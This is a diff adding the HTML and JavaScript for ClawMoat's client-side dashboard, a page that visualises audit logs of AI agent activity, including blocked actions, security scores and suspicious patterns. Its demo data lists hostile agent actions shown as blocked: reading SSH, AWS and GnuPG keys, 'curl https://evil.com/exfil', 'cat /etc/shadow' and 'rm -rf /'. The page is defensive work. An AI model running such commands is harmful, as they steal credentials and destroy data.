@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Agent Activity Dashboard — ClawMoat</title>
+<meta name="description" content="Free browser-based dashboard to visualize ClawMoat audit logs. See agent activity, blocked actions, security scores, and suspicious patterns. 100% client-side.">
+<link rel="canonical" href="https://clawmoat.com/dashboard/">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<meta property="og:title" content="Agent Activity Dashboard — ClawMoat">
+<meta property="og:description" content="Free tool to visualize ClawMoat audit logs. Charts, security scores, blocked action analysis. No data leaves your browser.">
+<meta property="og:url" content="https://clawmoat.com/dashboard/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--navy:#0F172A;--navy-light:#1E293B;--navy-mid:#334155;--blue:#3B82F6;--emerald:#10B981;--white:#F8FAFC;--gray:#94A3B8;--red:#EF4444;--amber:#F59E0B;--purple:#8B5CF6}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--navy);color:var(--white);line-height:1.6}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* Nav */
+nav{background:rgba(15,23,42,.95);backdrop-filter:blur(12px);border-bottom:1px solid rgba(59,130,246,.15);padding:16px 0;position:sticky;top:0;z-index:100}
+nav .container{display:flex;align-items:center;justify-content:space-between;max-width:1200px;margin:0 auto;padding:0 24px}
+.logo{font-size:1.25rem;font-weight:700;display:flex;align-items:center;gap:8px;color:var(--white)}
+.logo img{height:36px}
+.nav-links{display:flex;gap:24px;align-items:center}
+.nav-links a{color:var(--gray);font-size:.9rem;transition:color .2s}
+.nav-links a:hover{color:var(--white);text-decoration:none}
+.btn-sm{color:var(--navy)!important;background:var(--emerald);padding:6px 20px;border-radius:20px;font-weight:600;font-size:.85rem}
+
+/* Layout */
+.container{max-width:1200px;margin:0 auto;padding:0 24px}
+.hero{padding:60px 0 40px;text-align:center}
+.hero h1{font-size:2.5rem;font-weight:800;margin-bottom:12px;letter-spacing:-.02em}
+.hero h1 span{background:linear-gradient(135deg,var(--blue),var(--emerald));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{color:var(--gray);font-size:1.1rem;max-width:600px;margin:0 auto}
+.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(16,185,129,.12);color:var(--emerald);padding:4px 14px;border-radius:20px;font-size:.8rem;font-weight:600;margin-bottom:16px}
+
+/* Input section */
+.input-section{max-width:800px;margin:40px auto;padding:0 24px}
+.input-box{background:var(--navy-light);border:2px dashed var(--navy-mid);border-radius:12px;padding:40px;text-align:center;transition:border-color .2s;position:relative}
+.input-box.dragover{border-color:var(--blue)}
+.input-box h3{margin-bottom:8px;font-size:1.1rem}
+.input-box p{color:var(--gray);font-size:.9rem;margin-bottom:20px}
+textarea{width:100%;height:160px;background:var(--navy);border:1px solid var(--navy-mid);border-radius:8px;color:var(--white);padding:12px;font-family:'Fira Code',monospace;font-size:.85rem;resize:vertical}
+textarea::placeholder{color:var(--navy-mid)}
+.btn-row{display:flex;gap:12px;justify-content:center;margin-top:16px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:8px;font-weight:600;font-size:.95rem;border:none;cursor:pointer;transition:all .2s}
+.btn-primary{background:var(--blue);color:#fff}
+.btn-primary:hover{opacity:.9}
+.btn-outline{background:transparent;color:var(--gray);border:1px solid var(--navy-mid)}
+.btn-outline:hover{color:var(--white);border-color:var(--gray)}
+.btn-green{background:var(--emerald);color:var(--navy)}
+.btn-green:hover{opacity:.9}
+input[type=file]{display:none}
+
+/* Dashboard grid */
+.dashboard{display:none;max-width:1200px;margin:0 auto;padding:40px 24px 80px}
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:32px}
+.stat-card{background:var(--navy-light);border-radius:12px;padding:20px;border:1px solid rgba(255,255,255,.06)}
+.stat-card .label{font-size:.8rem;color:var(--gray);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px}
+.stat-card .value{font-size:2rem;font-weight:800}
+.stat-card .sub{font-size:.8rem;color:var(--gray);margin-top:4px}
+.score-good{color:var(--emerald)}
+.score-medium{color:var(--amber)}
+.score-bad{color:var(--red)}
+
+.charts-row{display:grid;grid-template-columns:2fr 1fr;gap:24px;margin-bottom:32px}
+.chart-card{background:var(--navy-light);border-radius:12px;padding:24px;border:1px solid rgba(255,255,255,.06)}
+.chart-card h3{font-size:1rem;margin-bottom:16px;color:var(--gray)}
+.chart-container{position:relative;height:280px}
+
+.table-section{background:var(--navy-light);border-radius:12px;padding:24px;border:1px solid rgba(255,255,255,.06);margin-bottom:32px}
+.table-section h3{font-size:1rem;margin-bottom:16px;color:var(--gray)}
+table{width:100%;border-collapse:collapse}
+th,td{text-align:left;padding:10px 12px;font-size:.85rem}
+th{color:var(--gray);font-weight:600;border-bottom:1px solid var(--navy-mid);text-transform:uppercase;font-size:.75rem;letter-spacing:.05em}
+td{border-bottom:1px solid rgba(255,255,255,.04)}
+.tag{display:inline-block;padding:2px 10px;border-radius:10px;font-size:.75rem;font-weight:600}
+.tag-blocked{background:rgba(239,68,68,.15);color:var(--red)}
+.tag-allowed{background:rgba(16,185,129,.15);color:var(--emerald)}
+.tag-warn{background:rgba(245,158,11,.15);color:var(--amber)}
+
+.recommendations{background:var(--navy-light);border-radius:12px;padding:24px;border:1px solid rgba(255,255,255,.06);margin-bottom:32px}
+.recommendations h3{font-size:1rem;margin-bottom:16px;color:var(--gray)}
+.rec-item{display:flex;gap:12px;align-items:flex-start;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.rec-item:last-child{border:none}
+.rec-icon{font-size:1.2rem;flex-shrink:0;margin-top:2px}
+.rec-text strong{display:block;margin-bottom:2px}
+.rec-text p{color:var(--gray);font-size:.85rem}
+
+.tier-bar{display:flex;height:32px;border-radius:8px;overflow:hidden;margin-top:8px}
+.tier-segment{display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;min-width:40px;transition:width .5s}
+
+/* CTA */
+.cta-section{text-align:center;padding:60px 24px;border-top:1px solid rgba(255,255,255,.06)}
+.cta-section h2{font-size:1.8rem;font-weight:800;margin-bottom:12px}
+.cta-section p{color:var(--gray);margin-bottom:24px;max-width:500px;margin-left:auto;margin-right:auto}
+
+/* Print */
+@media print{
+  nav,.input-section,.cta-section,.btn-row{display:none!important}
+  .dashboard{display:block!important}
+  body{background:#fff;color:#000}
+  .stat-card,.chart-card,.table-section,.recommendations{border:1px solid #ddd;background:#fff}
+  .stat-card .label,.chart-card h3,.recommendations h3,.table-section h3,th{color:#666}
+}
+
+/* Responsive */
+@media(max-width:768px){
+  .charts-row{grid-template-columns:1fr}
+  .hero h1{font-size:1.8rem}
+  .stats-row{grid-template-columns:repeat(2,1fr)}
+  .nav-links{display:none}
+}
+
+/* Suspicious patterns */
+.suspicious{background:var(--navy-light);border-radius:12px;padding:24px;border:1px solid rgba(239,68,68,.2);margin-bottom:32px}
+.suspicious h3{color:var(--red);font-size:1rem;margin-bottom:16px}
+.pattern-item{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.pattern-item:last-child{border:none}
+.pattern-name{font-weight:600;font-size:.9rem}
+.pattern-count{background:rgba(239,68,68,.15);color:var(--red);padding:2px 10px;border-radius:10px;font-size:.8rem;font-weight:600}
+</style>
+</head>
+<body>
+
+<nav>
+<div class="container">
+  <a href="/" class="logo"><img src="/logo.svg" alt="ClawMoat">ClawMoat</a>
+  <div class="nav-links">
+    <a href="/">Home</a>
+    <a href="/scan/">Scanner</a>
+    <a href="/dashboard/" style="color:var(--white)">Dashboard</a>
+    <a href="/blog/">Blog</a>
+    <a href="https://github.com/darfaz/clawmoat" class="btn-sm">GitHub ★</a>
+  </div>
+</div>
+</nav>
+
+<section class="hero">
+<div class="container">
+  <div class="badge">🔒 100% Client-Side — No Data Leaves Your Browser</div>
+  <h1>Agent Activity <span>Dashboard</span></h1>
+  <p>Visualize your ClawMoat audit logs. See what your AI agents are doing, what got blocked, and where the risks are.</p>
+</div>
+</section>
+
+<section class="input-section" id="inputSection">
+<div class="input-box" id="dropZone">
+  <h3>📊 Load Your Audit Log</h3>
+  <p>Paste ClawMoat audit log JSON below, or drag &amp; drop a file</p>
+  <textarea id="logInput" placeholder='[
+  {"timestamp":"2026-03-01T10:00:00Z","action":"file_read","path":"/home/user/.ssh/id_rsa","result":"blocked","category":"file_access","tier":"strict"},
+  {"timestamp":"2026-03-01T10:01:00Z","action":"tool_call","tool":"exec","result":"allowed","category":"tool_call","tier":"standard"},
+  ...
+]'></textarea>
+  <div class="btn-row">
+    <button class="btn btn-primary" onclick="analyzeLog()">🔍 Analyze Log</button>
+    <label class="btn btn-outline" for="fileInput">📁 Upload JSON</label>
+    <input type="file" id="fileInput" accept=".json,.jsonl,.log" onchange="loadFile(event)">
+    <button class="btn btn-outline" onclick="loadDemo()">⚡ Try Demo Data</button>
+    <button class="btn btn-outline" onclick="exportPDF()" id="exportBtn" style="display:none">📄 Export PDF</button>
+  </div>
+</div>
+</section>
+
+<div class="dashboard" id="dashboard">
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="label">Security Score</div>
+      <div class="value" id="securityScore">—</div>
+      <div class="sub" id="scoreLabel">Analyzing...</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Total Events</div>
+      <div class="value" id="totalEvents">0</div>
+      <div class="sub" id="timeRange">—</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Blocked Actions</div>
+      <div class="value" id="blockedCount" style="color:var(--red)">0</div>
+      <div class="sub" id="blockRate">0% block rate</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">Secrets Detected</div>
+      <div class="value" id="secretsCount" style="color:var(--amber)">0</div>
+      <div class="sub">credential exposures caught</div>
+    </div>
+  </div>
+
+  <!-- Permission Tier Usage -->
+  <div class="chart-card" style="margin-bottom:32px">
+    <h3>🛡️ Permission Tier Usage</h3>
+    <div id="tierDisplay" style="margin-top:8px"></div>
+  </div>
+
+  <div class="charts-row">
+    <div class="chart-card">
+      <h3>📈 Agent Activity Over Time</h3>
+      <div class="chart-container"><canvas id="timeChart"></canvas></div>
+    </div>
+    <div class="chart-card">
+      <h3>📊 Events by Category</h3>
+      <div class="chart-container"><canvas id="categoryChart"></canvas></div>
+    </div>
+  </div>
+
+  <!-- Suspicious Patterns -->
+  <div class="suspicious" id="suspiciousSection" style="display:none">
+    <h3>⚠️ Suspicious Patterns Detected</h3>
+    <div id="suspiciousPatterns"></div>
+  </div>
+
+  <!-- Blocked Actions Table -->
+  <div class="table-section">
+    <h3>🚫 Top Blocked Actions</h3>
+    <table>
+      <thead><tr><th>Action</th><th>Target</th><th>Category</th><th>Count</th><th>Status</th></tr></thead>
+      <tbody id="blockedTable"></tbody>
+    </table>
+  </div>
+
+  <!-- Recommendations -->
+  <div class="recommendations">
+    <h3>💡 Security Recommendations</h3>
+    <div id="recList"></div>
+  </div>
+</div>
+
+<section class="cta-section" id="ctaSection">
+  <h2>Protect Your Machine from AI Agents</h2>
+  <p>ClawMoat is the open-source security layer that guards your files, credentials, and system from autonomous AI agents.</p>
+  <div class="btn-row">
+    <a href="https://github.com/darfaz/clawmoat" class="btn btn-primary">⭐ Star on GitHub</a>
+    <a href="/" class="btn btn-green">Get ClawMoat — Free</a>
+  </div>
+</section>
+
+<script>
+// Demo data generator
+function generateDemoData(){
+  const cats=['file_access','network','tool_call','secrets_detected','file_access','tool_call','file_access','network','tool_call','tool_call'];
+  const tiers=['strict','standard','permissive','strict','standard'];
+  const actions=[
+    {action:'file_read',path:'/home/user/.ssh/id_rsa',result:'blocked',category:'file_access'},
+    {action:'file_read',path:'/home/user/.aws/credentials',result:'blocked',category:'file_access'},
+    {action:'file_read',path:'/home/user/project/src/app.js',result:'allowed',category:'file_access'},
+    {action:'exec',tool:'bash',args:'curl https://evil.com/exfil',result:'blocked',category:'network'},
+    {action:'exec',tool:'bash',args:'npm install lodash',result:'allowed',category:'tool_call'},
+    {action:'tool_call',tool:'web_fetch',args:'https://api.example.com/data',result:'allowed',category:'network'},
+    {action:'file_write',path:'/etc/passwd',result:'blocked',category:'file_access'},
+    {action:'exec',tool:'bash',args:'cat /etc/shadow',result:'blocked',category:'file_access'},
+    {action:'outbound_scan',detail:'AWS_SECRET_KEY detected in outbound message',result:'blocked',category:'secrets_detected'},
+    {action:'tool_call',tool:'message_send',args:'email to external',result:'allowed',category:'tool_call'},
+    {action:'file_read',path:'/home/user/.env',result:'blocked',category:'secrets_detected'},
+    {action:'exec',tool:'bash',args:'git push origin main',result:'allowed',category:'tool_call'},
+    {action:'file_read',path:'/home/user/project/README.md',result:'allowed',category:'file_access'},
+    {action:'exec',tool:'bash',args:'rm -rf /',result:'blocked',category:'tool_call'},
+    {action:'network_request',url:'https://pastebin.com/raw/abc123',result:'blocked',category:'network'},
+    {action:'file_read',path:'/home/user/.gnupg/private-keys-v1.d',result:'blocked',category:'file_access'},
+    {action:'tool_call',tool:'read',args:'/home/user/project/config.yaml',result:'allowed',category:'file_access'},
+    {action:'outbound_scan',detail:'GitHub token detected in clipboard',result:'blocked',category:'secrets_detected'},
+    {action:'exec',tool:'bash',args:'python3 train.py',result:'allowed',category:'tool_call'},
+    {action:'file_write',path:'/home/user/project/output.json',result:'allowed',category:'file_access'},
+    {action:'network_request',url:'https://crypto-miner.xyz/mine',result:'blocked',category:'network'},
+    {action:'exec',tool:'bash',args:'ls -la /tmp',result:'allowed',category:'tool_call'},
+    {action:'file_read',path:'/home/user/.bash_history',result:'blocked',category:'file_access'},
+    {action:'tool_call',tool:'web_search',args:'how to bypass security',result:'allowed',category:'tool_call'},
+    {action:'exec',tool:'bash',args:'ssh root@production-server',result:'blocked',category:'network'},
+  ];
+  const base=new Date('2026-03-01T08:00:00Z');
+  const events=[];
+  for(let i=0;i<120;i++){
+    const template=actions[Math.floor(Math.random()*actions.length)];
+    const t=new Date(base.getTime()+i*180000+Math.random()*60000);
+    events.push({...template,timestamp:t.toISOString(),tier:tiers[Math.floor(Math.random()*tiers.length)]});
+  }
+  return events;
+}
+
+let timeChartInstance=null, catChartInstance=null;
+
+function loadDemo(){
+  const data=generateDemoData();
+  document.getElementById('logInput').value=JSON.stringify(data,null,2);
+  analyzeLog();
+}
+
+function loadFile(e){
+  const file=e.target.files[0];
+  if(!file)return;
+  const reader=new FileReader();
+  reader.onload=function(ev){
+    document.getElementById('logInput').value=ev.target.result;
+    analyzeLog();
+  };
+  reader.readAsText(file);
+}
+
+// Drag and drop
+const dz=document.getElementById('dropZone');
+dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('dragover')});
+dz.addEventListener('dragleave',()=>dz.classList.remove('dragover'));
+dz.addEventListener('drop',e=>{
+  e.preventDefault();dz.classList.remove('dragover');
+  const file=e.dataTransfer.files[0];
+  if(file){const r=new FileReader();r.onload=ev=>{document.getElementById('logInput').value=ev.target.result;analyzeLog()};r.readAsText(file)}
+});
+
+function parseLog(raw){
+  raw=raw.trim();
+  // Try JSON array
+  try{const d=JSON.parse(raw);if(Array.isArray(d))return d;return[d]}catch(e){}
+  // Try JSONL
+  const lines=raw.split('\n').filter(l=>l.trim());
+  const results=[];
+  for(const l of lines){try{results.push(JSON.parse(l))}catch(e){}}
+  return results;
+}
+
+function analyzeLog(){
+  const raw=document.getElementById('logInput').value;
+  const events=parseLog(raw);
+  if(!events.length){alert('No valid log entries found. Check format.');return}
+
+  document.getElementById('dashboard').style.display='block';
+  document.getElementById('exportBtn').style.display='';
+
+  const total=events.length;
+  const blocked=events.filter(e=>e.result==='blocked');
+  const allowed=events.filter(e=>e.result==='allowed');
+  const secrets=events.filter(e=>e.category==='secrets_detected');
+  const blockRate=((blocked.length/total)*100).toFixed(1);
+
+  // Security score (100 - penalties)
+  let score=100;
+  score-=blocked.length*0.5; // some blocks are good (means protection worked)
+  score-=secrets.length*3; // secrets detected is concerning
+  const unsafeAllowed=events.filter(e=>e.result==='allowed'&&(e.category==='secrets_detected'||e.category==='network'));
+  score-=unsafeAllowed.length*5;
+  if(blockRate<10)score-=10; // too few blocks might mean loose policy
+  score=Math.max(0,Math.min(100,Math.round(score)));
+
+  document.getElementById('totalEvents').textContent=total;
+  document.getElementById('blockedCount').textContent=blocked.length;
+  document.getElementById('secretsCount').textContent=secrets.length;
+  document.getElementById('securityScore').textContent=score+'/100';
+  const scoreEl=document.getElementById('securityScore');
+  scoreEl.className='value '+(score>=80?'score-good':score>=50?'score-medium':'score-bad');
+  document.getElementById('scoreLabel').textContent=score>=80?'Strong protection':score>=50?'Needs attention':'Critical — review policy';
+  
+  // Time range
+  const timestamps=events.filter(e=>e.timestamp).map(e=>new Date(e.timestamp)).sort((a,b)=>a-b);
+  if(timestamps.length>=2){
+    const fmt=d=>d.toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+    document.getElementById('timeRange').textContent=fmt(timestamps[0])+' → '+fmt(timestamps[timestamps.length-1]);
+  }
+
+  // Block rate
+  document.getElementById('blockRate').textContent=blockRate+'% block rate';
+
+  // Time series chart
+  buildTimeChart(events);
+  buildCategoryChart(events);
+  buildBlockedTable(blocked);
+  buildTierDisplay(events);
+  buildSuspicious(events);
+  buildRecommendations(events,score,blocked,secrets);
+}
+
+function buildTimeChart(events){
+  const byTime={};
+  events.forEach(e=>{
+    if(!e.timestamp)return;
+    const d=new Date(e.timestamp);
+    const key=d.toISOString().slice(0,13)+':00'; // hourly buckets
+    if(!byTime[key])byTime[key]={allowed:0,blocked:0};
+    byTime[key][e.result==='blocked'?'blocked':'allowed']++;
+  });
+  const labels=Object.keys(byTime).sort();
+  const allowedData=labels.map(k=>byTime[k].allowed);
+  const blockedData=labels.map(k=>byTime[k].blocked);
+  const shortLabels=labels.map(l=>{const d=new Date(l);return d.getHours()+':00'});
+
+  if(timeChartInstance)timeChartInstance.destroy();
+  timeChartInstance=new Chart(document.getElementById('timeChart'),{
+    type:'bar',
+    data:{labels:shortLabels,datasets:[
+      {label:'Allowed',data:allowedData,backgroundColor:'rgba(16,185,129,.7)',borderRadius:4},
+      {label:'Blocked',data:blockedData,backgroundColor:'rgba(239,68,68,.7)',borderRadius:4}
+    ]},
+    options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{labels:{color:'#94A3B8'}}},scales:{
+      x:{stacked:true,ticks:{color:'#94A3B8'},grid:{color:'rgba(255,255,255,.05)'}},
+      y:{stacked:true,ticks:{color:'#94A3B8'},grid:{color:'rgba(255,255,255,.05)'}}
+    }}
+  });
+}
+
+function buildCategoryChart(events){
+  const cats={};
+  events.forEach(e=>{const c=e.category||'unknown';cats[c]=(cats[c]||0)+1});
+  const labels=Object.keys(cats);
+  const data=Object.values(cats);
+  const colors=['#3B82F6','#EF4444','#10B981','#F59E0B','#8B5CF6','#EC4899','#06B6D4','#F97316'];
+
+  if(catChartInstance)catChartInstance.destroy();
+  catChartInstance=new Chart(document.getElementById('categoryChart'),{
+    type:'doughnut',
+    data:{labels:labels.map(l=>l.replace(/_/g,' ')),datasets:[{data,backgroundColor:colors.slice(0,labels.length),borderWidth:0}]},
+    options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{position:'bottom',labels:{color:'#94A3B8',padding:12,font:{size:11}}}}}
+  });
+}
+
+function buildBlockedTable(blocked){
+  // Aggregate blocked by action+target
+  const agg={};
+  blocked.forEach(e=>{
+    const key=(e.action||'unknown')+'|'+(e.path||e.url||e.tool||e.detail||'—');
+    if(!agg[key])agg[key]={action:e.action,target:e.path||e.url||e.tool||e.detail||'—',category:e.category||'unknown',count:0};
+    agg[key].count++;
+  });
+  const sorted=Object.values(agg).sort((a,b)=>b.count-a.count).slice(0,15);
+  const tbody=document.getElementById('blockedTable');
+  tbody.innerHTML=sorted.map(r=>`<tr>
+    <td><code>${esc(r.action)}</code></td>
+    <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(r.target)}">${esc(r.target)}</td>
+    <td><span class="tag tag-warn">${esc(r.category.replace(/_/g,' '))}</span></td>
+    <td>${r.count}</td>
+    <td><span class="tag tag-blocked">Blocked</span></td>
+  </tr>`).join('');
+  if(!sorted.length)tbody.innerHTML='<tr><td colspan="5" style="color:var(--gray);text-align:center">No blocked actions found</td></tr>';
+}
+
+function buildTierDisplay(events){
+  const tiers={strict:0,standard:0,permissive:0};
+  events.forEach(e=>{const t=e.tier||'standard';if(tiers[t]!==undefined)tiers[t]++});
+  const total=events.length||1;
+  const colors={strict:'var(--red)',standard:'var(--blue)',permissive:'var(--amber)'};
+  const container=document.getElementById('tierDisplay');
+  let html='<div class="tier-bar">';
+  for(const[tier,count]of Object.entries(tiers)){
+    const pct=((count/total)*100).toFixed(1);
+    if(count>0)html+=`<div class="tier-segment" style="width:${pct}%;background:${colors[tier]}">${tier} ${pct}%</div>`;
+  }
+  html+='</div>';
+  html+='<div style="display:flex;gap:24px;margin-top:12px;font-size:.85rem;color:var(--gray)">';
+  for(const[tier,count]of Object.entries(tiers)){
+    html+=`<span><span style="display:inline-block;width:10px;height:10px;border-radius:50%;background:${colors[tier]};margin-right:6px"></span>${tier}: ${count} events</span>`;
+  }
+  html+='</div>';
+  container.innerHTML=html;
+}
+
+function buildSuspicious(events){
+  const patterns=[];
+  // Check for rapid-fire actions (>10 in a minute)
+  const byMinute={};
+  events.forEach(e=>{if(!e.timestamp)return;const k=e.timestamp.slice(0,16);byMinute[k]=(byMinute[k]||0)+1});
+  const bursts=Object.values(byMinute).filter(v=>v>10).length;
+  if(bursts)patterns.push({name:'Burst activity (>10 actions/min)',count:bursts+' bursts'});
+  
+  // Repeated blocked attempts on same target
+  const blockedTargets={};
+  events.filter(e=>e.result==='blocked').forEach(e=>{const t=e.path||e.url||'';if(t){blockedTargets[t]=(blockedTargets[t]||0)+1}});
+  Object.entries(blockedTargets).filter(([,c])=>c>=3).forEach(([t,c])=>{
+    patterns.push({name:'Repeated blocked access: '+t.slice(-50),count:c+'x'});
+  });
+
+  // Secrets in outbound
+  const outSecrets=events.filter(e=>e.category==='secrets_detected'&&e.result==='blocked').length;
+  if(outSecrets)patterns.push({name:'Credential/secret exposure attempts',count:outSecrets});
+
+  // SSH/network blocked
+  const sshAttempts=events.filter(e=>(e.args||'').includes('ssh')&&e.result==='blocked').length;
+  if(sshAttempts)patterns.push({name:'SSH connection attempts blocked',count:sshAttempts});
+
+  const section=document.getElementById('suspiciousSection');
+  const container=document.getElementById('suspiciousPatterns');
+  if(patterns.length){
+    section.style.display='block';
+    container.innerHTML=patterns.map(p=>`<div class="pattern-item"><span class="pattern-name">${esc(p.name)}</span><span class="pattern-count">${p.count}</span></div>`).join('');
+  }else{
+    section.style.display='none';
+  }
+}
+
+function buildRecommendations(events,score,blocked,secrets){
+  const recs=[];
+  const total=events.length;
+  const blockRate=blocked.length/total;
+  
+  if(blockRate<0.05)recs.push({icon:'⚠️',title:'Very low block rate',text:'Only '+((blockRate*100).toFixed(1))+'% of actions were blocked. Consider tightening your permission policy — a healthy rate is 10-30%.'});
+  if(blockRate>0.5)recs.push({icon:'🔴',title:'High block rate',text:(blockRate*100).toFixed(1)+'% of actions blocked. Your agent may be misconfigured or attempting unauthorized operations frequently.'});
+  if(secrets.length>0)recs.push({icon:'🔑',title:'Secrets detected in transit',text:secrets.length+' credential exposure(s) caught. Review your .clawmoat.yaml forbidden zones and ensure all secret files are protected.'});
+  
+  const sshBlocked=events.filter(e=>(e.args||'').includes('ssh')&&e.result==='blocked');
+  if(sshBlocked.length)recs.push({icon:'🌐',title:'SSH attempts detected',text:'Your agent tried to SSH to external servers '+sshBlocked.length+' time(s). If not expected, investigate the agent\'s instructions.'});
+  
+  const strictEvents=events.filter(e=>e.tier==='strict').length;
+  if(strictEvents/total<0.3)recs.push({icon:'🛡️',title:'Consider strict tier',text:'Only '+(strictEvents/total*100).toFixed(0)+'% of events use strict tier. For sensitive workloads, enable strict mode to block all file writes and network access.'});
+  
+  if(score>=80)recs.push({icon:'✅',title:'Good security posture',text:'Your ClawMoat configuration is catching threats effectively. Keep audit logs enabled and review periodically.'});
+
+  if(!recs.length)recs.push({icon:'✅',title:'No immediate concerns',text:'Your audit log looks clean. Keep monitoring!'});
+
+  document.getElementById('recList').innerHTML=recs.map(r=>`<div class="rec-item"><span class="rec-icon">${r.icon}</span><div class="rec-text"><strong>${esc(r.title)}</strong><p>${esc(r.text)}</p></div></div>`).join('');
+}
+
+function exportPDF(){window.print()}
+
+function esc(s){const d=document.createElement('div');d.textContent=s||'';return d.innerHTML}
+</script>
+
+</body>
+</html>
